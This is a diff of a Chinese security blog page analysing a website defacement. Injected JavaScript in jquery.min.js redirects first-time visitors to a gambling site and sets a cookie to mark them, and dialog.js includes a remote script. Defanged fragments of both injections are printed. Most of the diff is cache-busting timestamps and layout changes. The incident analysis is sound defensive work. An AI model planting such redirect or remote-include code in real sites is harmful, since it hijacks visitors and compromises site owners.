@@ -10,18 +10,18 @@
     <title>页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%A6%96%E6%AC%A1%E4%BC%9A%E8%AF%9D%E8%B7%B3%E8%BD%AC%E8%8F%A0%E8%8F%9C%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/index.xml" rel="alternate" type="application/rss+xml" title="页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1691111843" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691111843" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1691111843" rel="stylesheet">
-    <link href="/css/auto-complete.css?1691111843" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691111843" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1691111843" rel="stylesheet">
-    <link href="/css/fonts.css?1691111843" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691111843" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1691111843" rel="stylesheet">
-    <link href="/css/theme-auto.css?1691111843" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1691111843" rel="stylesheet">
-    <link href="/css/print.css?1691111843" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1691111843" rel="stylesheet">
-    <script src="/js/url.js?1691111843"></script>
-    <script src="/js/variant.js?1691111843"></script>
+    <link href="/css/fontawesome-all.min.css?1691251877" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691251877" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1691251877" rel="stylesheet">
+    <link href="/css/auto-complete.css?1691251877" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691251877" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1691251877" rel="stylesheet">
+    <link href="/css/fonts.css?1691251877" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691251877" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1691251877" rel="stylesheet">
+    <link href="/css/theme-auto.css?1691251877" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1691251877" rel="stylesheet">
+    <link href="/css/print.css?1691251877" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1691251877" rel="stylesheet">
+    <script src="/js/url.js?1691251877"></script>
+    <script src="/js/variant.js?1691251877"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -96,10 +96,10 @@
 <h3 id="前言">前言</h3>
 <p>在某会曾经出现过一次基于运营商的某度广告推广导致手机平台恶意跳转现象，本次样本发现了一处类似的现象，对其分析发现通过脚本实现的首次跳转功能。下面是详细过程。
 
-<a href="#image-af47b9a7376408b54b5661a8e3cfcdd5" class="lightbox-link">
+<a href="#image-1b9c91ac40094a351f58f68afb91bea2" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-af47b9a7376408b54b5661a8e3cfcdd5">
+<a href="javascript:history.back();" class="lightbox" id="image-1b9c91ac40094a351f58f68afb91bea2">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <p>可以看到，整个跳转流程。现在需要做的就是分析其中原理。
@@ -111,10 +111,10 @@ https://tz01321[.]com Referer	https://sdfhu1[.]com/248486.html
 https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="定位篡改点">定位篡改点</h3>
 <p>现在就是确定具体被篡改的位置了：
 
-<a href="#image-2c0d5fc5e72cefdf6fa9647c2cf1bb39" class="lightbox-link">
+<a href="#image-5d46d872304eb8b38f4a3f379f1e5240" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-2c0d5fc5e72cefdf6fa9647c2cf1bb39">
+<a href="javascript:history.back();" class="lightbox" id="image-5d46d872304eb8b38f4a3f379f1e5240">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 可以看到这个/statics/js/jquery.min.js文件内被插入下面这段代码，并且根据逻辑可以知道，在用户第一次访问的时候触发此脚本，客户跳转至https[:]//sdfhu1[.]com/248486.html ，同时添加设置cookie,打标非第一次访问，这样下次访问就不会触发此跳转。</p>
@@ -129,26 +129,26 @@ https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="
 </span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https[:]//sdfhu1[.]com/248486.html&#39;</span>
 </span></span><span style="display:flex;"><span>     }</span></span></code></pre></div><p>下面为该脚本在源代码的位置：
 
-<a href="#image-54f9fdea6c36fde44e39017476ccbd3c" class="lightbox-link">
+<a href="#image-0bf5f1ad2225b67e8da556043210be8a" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-54f9fdea6c36fde44e39017476ccbd3c">
+<a href="javascript:history.back();" class="lightbox" id="image-0bf5f1ad2225b67e8da556043210be8a">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 除了上面的脚本，我们在/statics/js/dialog.js中发现了这样一段，开始怀疑但最后证明仍然为篡改菠菜网站相关：
 
-<a href="#image-7abcc7221b48a9e993d15236de3ca3d3" class="lightbox-link">
+<a href="#image-782eb9f3819d01619729bf5828d9a436" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-7abcc7221b48a9e993d15236de3ca3d3">
+<a href="javascript:history.back();" class="lightbox" id="image-782eb9f3819d01619729bf5828d9a436">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 其中引入了这样一段，而直接访问该脚本不显示任何内容，因此暂时未知其功能：</p>
 <div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">include</span>(<span style="color:#e6db74">&#34;http[:]//www[.]oydaiyun[.]com/images/js.js&#34;</span>);</span></span></code></pre></div><div class="wrap-code highlight"><pre tabindex="0"><code>oydaiyun[.]com  referer http[:]//www[.]oydaiyun[.]com/images/js.js </code></pre></div><p>
-<a href="#image-ce19c22f14589537b99033ea8f474c4d" class="lightbox-link">
+<a href="#image-1a46d9b9e8010c8d0b0de5417f8a964b" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-ce19c22f14589537b99033ea8f474c4d">
+<a href="javascript:history.back();" class="lightbox" id="image-1a46d9b9e8010c8d0b0de5417f8a964b">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h3 id="分析过程">分析过程</h3>
@@ -184,12 +184,12 @@ tz01321[.]com</p>
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1691111845" defer></script>
-        <script src="/js/lunr/lunr.min.js?1691111845" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1691111845" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1691111845" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1691111845" defer></script>
-        <script src="/js/search.js?1691111845" defer></script>
+        <script src="/js/auto-complete.js?1691251878" defer></script>
+        <script src="/js/lunr/lunr.min.js?1691251878" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1691251878" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1691251878" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1691251878" defer></script>
+        <script src="/js/search.js?1691251878" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -210,7 +210,7 @@ tz01321[.]com</p>
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html" class=""><input type="checkbox" id="section-7fff60dfdaa5ccf8d63424e07c41a0a2" aria-controls="subsections-7fff60dfdaa5ccf8d63424e07c41a0a2"><label for="section-7fff60dfdaa5ccf8d63424e07c41a0a2"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 0x00电子取证标准</span></label><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html">0x00电子取证标准<i class="fas fa-check read-icon"></i></a><ul id="subsections-7fff60dfdaa5ccf8d63424e07c41a0a2" class="morespace collapsible-menu">
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html" class=""><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html">2.0电子取证标准<i class="fas fa-check read-icon"></i></a></li></ul></li>
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html" class=""><input type="checkbox" id="section-8f02c2961ea54145c9239661e2bd6b86" aria-controls="subsections-8f02c2961ea54145c9239661e2bd6b86"><label for="section-8f02c2961ea54145c9239661e2bd6b86"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 0x01现场勘查</span></label><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html">0x01现场勘查<i class="fas fa-check read-icon"></i></a><ul id="subsections-8f02c2961ea54145c9239661e2bd6b86" class="morespace collapsible-menu">
-          <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html" class=""><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html">现场看擦<i class="fas fa-check read-icon"></i></a></li></ul></li>
+          <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html" class=""><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html">现场勘查<i class="fas fa-check read-icon"></i></a></li></ul></li>
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/index.html" class=""><input type="checkbox" id="section-206bf0cd228714da00e540f18edc5db5" aria-controls="subsections-206bf0cd228714da00e540f18edc5db5"><label for="section-206bf0cd228714da00e540f18edc5db5"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 0x02电子取证</span></label><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/index.html">0x02电子取证<i class="fas fa-check read-icon"></i></a><ul id="subsections-206bf0cd228714da00e540f18edc5db5" class="morespace collapsible-menu">
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/index.html" class=""><input type="checkbox" id="section-89535f58c579af51d3b6f3412f0b0639" aria-controls="subsections-89535f58c579af51d3b6f3412f0b0639"><label for="section-89535f58c579af51d3b6f3412f0b0639"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 1磁盘镜像</span></label><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/index.html">1磁盘镜像<i class="fas fa-check read-icon"></i></a><ul id="subsections-89535f58c579af51d3b6f3412f0b0639" class="morespace collapsible-menu">
           <li data-nav-id="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Clonezilla/index.html" class=""><a class="padding" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Clonezilla/index.html">Clonezilla<i class="fas fa-check read-icon"></i></a></li>
@@ -374,8 +374,8 @@ tz01321[.]com</p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1691111845" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1691111845" defer></script>
+    <script src="/js/clipboard.min.js?1691251878" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1691251878" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -405,15 +405,15 @@ tz01321[.]com</p>
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1691111845" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1691111845" defer></script>
+    <script src="/js/d3/d3-color.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1691251878" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1691251878" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -422,8 +422,8 @@ tz01321[.]com</p>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691111845  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691251878  };
     </script>
-    <script src="/js/theme.js?1691111845" defer></script>
+    <script src="/js/theme.js?1691251878" defer></script>
   </body>
 </html>
